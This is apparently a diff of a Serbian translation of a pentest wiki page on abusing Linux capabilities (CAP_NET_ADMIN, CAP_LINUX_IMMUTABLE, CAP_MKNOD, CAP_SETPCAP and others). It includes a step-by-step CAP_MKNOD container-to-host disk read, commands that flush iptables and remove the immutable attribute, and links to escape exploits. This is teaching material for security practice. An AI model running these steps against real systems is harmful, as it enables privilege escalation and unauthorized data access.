+[**CAP_NET_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) capability daje vlasniku mogućnost da **menja mrežne konfiguracije**, uključujući podešavanja firewall-a, routing tabele, dozvole socket-a i podešavanja mrežnih interfejsa unutar izloženih network namespaces. Takođe omogućava uključivanje **promiscuous mode** režima na mrežnim interfejsima, što dozvoljava sniffing paketa kroz namespaces.
 
-**Primer sa binary**
+**Primer sa binary-jem**
 
 Pretpostavimo da **python binary** ima ove capabilities.
 ```python
@@ -1425,11 +1420,11 @@ iptc.easy.flush_table('filter')
 ```
 ## CAP_LINUX_IMMUTABLE
 
-**Ovo znači da je moguće menjati atribute inode-a.** Ovom capability-jem ne možete direktno eskalirati privilegije.
+**To znači da je moguće menjati atribute inode-a.** Ne možete direktno eskalirati privilegije pomoću ove capability.
 
-**Primer sa binary fajlom**
+**Primer sa binary**
 
-Ako pronađete da je fajl immutable, a python ima ovu capability, možete **ukloniti immutable atribut i učiniti fajl izmenjivim:**
+Ako pronađete da je fajl immutable i da python ima ovu capability, možete **ukloniti immutable atribut i učiniti fajl izmenjivim:**
 ```python
 #Check that the file is imutable
 lsattr file.sh
@@ -1462,46 +1457,46 @@ f.write('New content for the file\n')
 
 ## CAP_SYS_CHROOT
 
-[**CAP_SYS_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) omogućava izvršavanje sistemskog poziva `chroot(2)`, što potencijalno može omogućiti izlazak iz `chroot(2)` okruženja korišćenjem poznatih ranjivosti:
+[**CAP_SYS_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) omogućava izvršavanje `chroot(2)` system call-a, što potencijalno može omogućiti escape iz `chroot(2)` okruženja pomoću poznatih ranjivosti:<sup>[[11]](#references)</sup>
 
-- [How to break out from various chroot solutions](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)
+- [How to break out from various chroot solutions](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)<sup>[[11]](#references)</sup>
 - [chw00t: chroot escape tool](https://github.com/earthquake/chw00t/)
 
 ## CAP_SYS_BOOT
 
-[**CAP_SYS_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) ne omogućava samo izvršavanje sistemskog poziva `reboot(2)` za ponovno pokretanje sistema, uključujući specifične komande kao što je `LINUX_REBOOT_CMD_RESTART2`, prilagođene određenim hardverskim platformama, već omogućava i korišćenje `kexec_load(2)` i, počevši od Linux 3.17, `kexec_file_load(2)` za učitavanje novih, odnosno potpisanih crash kernel-a.
+[**CAP_SYS_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) ne omogućava samo izvršavanje `reboot(2)` system call-a za restartovanje sistema, uključujući specifične komande poput `LINUX_REBOOT_CMD_RESTART2`, prilagođene određenim hardware platformama, već omogućava i korišćenje `kexec_load(2)` i, od Linux 3.17, `kexec_file_load(2)` za učitavanje novih, odnosno potpisanih crash kernel-a.
 
 ## CAP_SYSLOG
 
-[**CAP_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) izdvojen je iz šireg **CAP_SYS_ADMIN** u Linux 2.6.37, posebno omogućavajući korišćenje poziva `syslog(2)`. Ova capability omogućava pregled kernel adresa putem `/proc` i sličnih interfejsa kada je podešavanje `kptr_restrict` postavljeno na 1, čime se kontroliše izlaganje kernel adresa. Od Linux 2.6.39, podrazumevana vrednost za `kptr_restrict` je 0, što znači da su kernel adrese izložene, iako mnoge distribucije ovo podešavanje postavljaju na 1 (sakrij adrese osim od uid 0) ili 2 (uvek sakrij adrese) iz bezbednosnih razloga.
+[**CAP_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) izdvojen je iz šireg **CAP_SYS_ADMIN** u Linux-u 2.6.37, čime je posebno omogućeno korišćenje `syslog(2)` call-a. Ova capability omogućava pregled kernel adresa preko `/proc` i sličnih interfejsa kada je `kptr_restrict` podešen na 1, što kontroliše izlaganje kernel adresa. Od Linux-a 2.6.39, podrazumevana vrednost za `kptr_restrict` je 0, što znači da su kernel adrese izložene, iako mnoge distribucije ovo podešavaju na 1 (sakrij adrese osim od uid 0) ili 2 (uvek sakrij adrese) iz bezbednosnih razloga.
 
-Pored toga, **CAP_SYSLOG** omogućava pristup `dmesg` izlazu kada je `dmesg_restrict` postavljen na 1. Uprkos ovim promenama, **CAP_SYS_ADMIN** i dalje zadržava mogućnost obavljanja `syslog` operacija zbog istorijskih razloga.
+Pored toga, **CAP_SYSLOG** omogućava pristup `dmesg` output-u kada je `dmesg_restrict` podešen na 1. Uprkos ovim promenama, **CAP_SYS_ADMIN** zadržava mogućnost obavljanja `syslog` operacija zbog istorijskih razloga.
 
 ## CAP_MKNOD
 
-[**CAP_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) proširuje funkcionalnost sistemskog poziva `mknod` izvan kreiranja običnih datoteka, FIFO (named pipes) ili UNIX domain sockets. Konkretno, omogućava kreiranje special files, koje obuhvataju:
+[**CAP_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) proširuje funkcionalnost `mknod` system call-a izvan kreiranja regularnih fajlova, FIFO-ova (named pipe-ova) ili UNIX domain socket-a. Konkretno, omogućava kreiranje special fajlova, koji uključuju:
 
-- **S_IFCHR**: Character special files, odnosno uređaji kao što su terminali.
-- **S_IFBLK**: Block special files, odnosno uređaji kao što su diskovi.
+- **S_IFCHR**: Character special fajlovi, odnosno device-i poput terminala.
+- **S_IFBLK**: Block special fajlovi, odnosno device-i poput diskova.
 
-Ova capability je neophodna procesima koji zahtevaju mogućnost kreiranja device files, čime se omogućava direktna interakcija sa hardverom putem character ili block uređaja.
+Ova capability je neophodna za procese kojima je potrebna mogućnost kreiranja device fajlova, čime se omogućava direktna interakcija sa hardware-om preko character ili block device-a.
 
-Ovo je podrazumevana docker capability ([https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).
+To je podrazumevana docker capability ([https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).
 
-Ova capability omogućava privilege escalation (putem potpunog čitanja diska) na hostu, pod sledećim uslovima:
+Ova capability omogućava privilege escalation (putem čitanja celog diska) na host-u, pod sledećim uslovima:<sup>[[7]](#references)</sup>
 
-1. Imati početni pristup hostu (Unprivileged).
+1. Imati početni pristup host-u (Unprivileged).
 2. Imati početni pristup container-u (Privileged (EUID 0) i efektivni `CAP_MKNOD`).
-3. Host i container moraju deliti isti user namespace.
+3. Host i container treba da dele isti user namespace.
 
-**Koraci za kreiranje i pristup Block Device-u u container-u:**
+**Koraci za kreiranje i pristup Block Device-u u Container-u:**
 
-1. **Na hostu kao standardni korisnik:**
+1. **Na Host-u kao Standard User:**
 
 - Odredite svoj trenutni user ID pomoću `id`, npr. `uid=1000(standarduser)`.
-- Identifikujte ciljni uređaj, na primer `/dev/sdb`.
+- Identifikujte ciljni device, na primer `/dev/sdb`.
 
-2. **Unutar container-a kao `root`:**
+2. **Unutar Container-a kao `root`:**
 ```bash
 # Create a block special file for the host device
 mknod /dev/sdb b 8 16
@@ -1512,7 +1507,7 @@ useradd -u 1000 standarduser
 # Switch to the newly created user
 su standarduser
 ```
-3. **Ponovo na Hostu:**
+3. **Nazad na Hostu:**
 ```bash
 # Locate the PID of the container process owned by "standarduser"
 # This is an illustrative example; actual command might vary
@@ -1521,34 +1516,36 @@ ps aux | grep -i container_name | grep -i standarduser
 # Access the container's filesystem and the special block device
 head /proc/12345/root/dev/sdb
 ```
-Ovaj pristup omogućava standardnom korisniku da pristupi podacima na `/dev/sdb` kroz container i potencijalno ih čita, iskorišćavajući deljene user namespaces i permissions podešene na uređaju.
+Ovaj pristup omogućava standardnom korisniku da pristupi podacima na uređaju `/dev/sdb` kroz container i potencijalno ih pročita, iskorišćavajući deljene user namespaces i permissions postavljene na uređaju.
 
 ### CAP_SETPCAP
 
-**CAP_SETPCAP** omogućava procesu da **menja capability sets** drugog procesa, čime se omogućava dodavanje ili uklanjanje capabilities iz effective, inheritable i permitted sets. Međutim, proces može da menja samo capabilities koje poseduje u sopstvenom permitted setu, čime se osigurava da ne može da poveća privileges drugog procesa iznad sopstvenog nivoa. Novije kernel updates dodatno su pooštrili ova pravila, ograničavajući `CAP_SETPCAP` na smanjivanje capabilities unutar sopstvenog permitted seta ili permitted setova svojih descendants, sa ciljem ublažavanja security risks. Upotreba zahteva da `CAP_SETPCAP` bude u effective setu, a target capabilities u permitted setu, uz korišćenje `capset()` za izmene. Ovo sažima osnovnu funkciju i ograničenja `CAP_SETPCAP`, naglašavajući njegovu ulogu u privilege managementu i unapređenju security-ja.
+**CAP_SETPCAP** omogućava procesu da **menja capability sets** drugog procesa, čime se omogućava dodavanje ili uklanjanje capabilities iz effective, inheritable i permitted sets. Međutim, proces može da menja samo capabilities koje poseduje u sopstvenom permitted setu, čime se sprečava da privileges drugog procesa podigne iznad sopstvenog nivoa. Novija ažuriranja kernela pooštrila su ova pravila, ograničavajući `CAP_SETPCAP` na smanjivanje capabilities unutar sopstvenog permitted seta ili permitted setova svojih potomaka, sa ciljem ublažavanja security rizika. Za korišćenje je potrebno imati `CAP_SETPCAP` u effective setu i ciljne capabilities u permitted setu, uz korišćenje `capset()` za izmene. Ovo sažima osnovnu funkciju i ograničenja `CAP_SETPCAP`, naglašavajući njegovu ulogu u upravljanju privileges i unapređenju security-ja.
 
 **`CAP_SETPCAP`** je Linux capability koja procesu omogućava da **menja capability sets drugog procesa**. Omogućava dodavanje ili uklanjanje capabilities iz effective, inheritable i permitted capability sets drugih procesa. Međutim, postoje određena ograničenja u načinu korišćenja ove capability.
 
-Proces sa `CAP_SETPCAP` **može da dodeli ili ukloni samo capabilities koje se nalaze u njegovom sopstvenom permitted capability setu**. Drugim rečima, proces ne može dodeliti capability drugom procesu ako je sam ne poseduje. Ovo ograničenje sprečava proces da poveća privileges drugog procesa iznad sopstvenog nivoa privileges.
+Proces sa `CAP_SETPCAP` **može da dodeli ili ukloni samo capabilities koje se nalaze u njegovom sopstvenom permitted capability setu**. Drugim rečima, proces ne može da dodeli capability drugom procesu ako je sam ne poseduje. Ovo ograničenje sprečava proces da privileges drugog procesa podigne iznad sopstvenog nivoa privileges.
 
-Pored toga, u novijim kernel versions, `CAP_SETPCAP` capability je **dodatno ograničena**. Više ne omogućava procesu da proizvoljno menja capability sets drugih procesa. Umesto toga, **omogućava procesu samo da smanji capabilities u sopstvenom permitted capability setu ili permitted capability setu svojih descendants**. Ova promena uvedena je radi smanjenja potencijalnih security risks povezanih sa ovom capability.
+Pored toga, u novijim verzijama kernela capability `CAP_SETPCAP` je **dodatno ograničena**. Ona više ne omogućava procesu da proizvoljno menja capability sets drugih procesa. Umesto toga, **omogućava procesu samo da smanji capabilities u sopstvenom permitted capability setu ili permitted capability setu svojih potomaka**. Ova izmena je uvedena radi smanjenja potencijalnih security rizika povezanih sa ovom capability.
 
-Za efektivno korišćenje `CAP_SETPCAP`, potrebno je da capability bude prisutna u vašem effective capability setu, a target capabilities u vašem permitted capability setu. Zatim možete koristiti `capset()` system call za izmenu capability sets drugih procesa.
+Za efikasno korišćenje `CAP_SETPCAP`, potrebno je da capability bude prisutna u vašem effective capability setu, a ciljne capabilities u vašem permitted capability setu. Zatim možete koristiti system call `capset()` za izmenu capability sets drugih procesa.
 
-Ukratko, `CAP_SETPCAP` omogućava procesu da menja capability sets drugih procesa, ali ne može dodeliti capabilities koje sam ne poseduje. Pored toga, zbog security concerns, njena funkcionalnost je u novijim kernel versions ograničena samo na smanjivanje capabilities u sopstvenom permitted capability setu ili permitted capability setovima svojih descendants.
+Ukratko, `CAP_SETPCAP` procesu omogućava da menja capability sets drugih procesa, ali ne može da dodeli capabilities koje sam ne poseduje. Pored toga, zbog security problema, njena funkcionalnost je u novijim verzijama kernela ograničena tako da omogućava samo smanjivanje capabilities u sopstvenom permitted capability setu ili permitted capability setovima svojih potomaka.
 
 ## Reference
 
-**Većina ovih primera preuzeta je iz nekoliko labova sa** [**https://attackdefense.pentesteracademy.com/**](https://attackdefense.pentesteracademy.com), pa ako želite da vežbate ove privesc techniques, preporučujem ove labove.
+- [1] [AttackDefense (Pentester Academy) - Linux capabilities privilege escalation labs](https://attackdefense.pentesteracademy.com)
+- [2] [Hacker's Grimoire - Privilege Escalation Linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
+- [3] [Linux Container Basics: Capabilities](https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/)
+- [4] [Linux capabilities 101](https://linux-audit.com/linux-capabilities-101/)
+- [5] [Taking Advantage of Linux Capabilities](https://www.linuxjournal.com/article/5737)
+- [6] [Excessive Capabilities](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module)
+- [7] [WithSecure Labs: Abusing the access to mount namespaces through /proc/pid/root](https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot)
+- [8] [Linux Capabilities: Why They Exist and How They Work](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
+- [9] [Understanding Capabilities in Linux](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)
+- [10] [PoC for bypassing seccomp if ptrace is allowed](https://gist.github.com/thejh/8346f47e359adecd1d53)
+- [11] [How to break out from various chroot solutions](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)
+- [12] [shocker.c - original CAP_DAC_READ_SEARCH Docker breakout exploit by Sebastian Krahmer](http://stealth.openwall.net/xSports/shocker.c)
+- [13] [Docker breakout exploit analysis](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)
 
-**Druge reference**:
-
-- [https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
-- [https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/#:\~:text=Inherited%20capabilities%3A%20A%20process%20can,a%20binary%2C%20e.g.%20using%20setcap%20.](https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/)
-- [https://linux-audit.com/linux-capabilities-101/](https://linux-audit.com/linux-capabilities-101/)
-- [https://www.linuxjournal.com/article/5737](https://www.linuxjournal.com/article/5737)
-- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module)
-- [https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot](https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot)
-
-​
 {{#include ../../banners/hacktricks-training.md}}
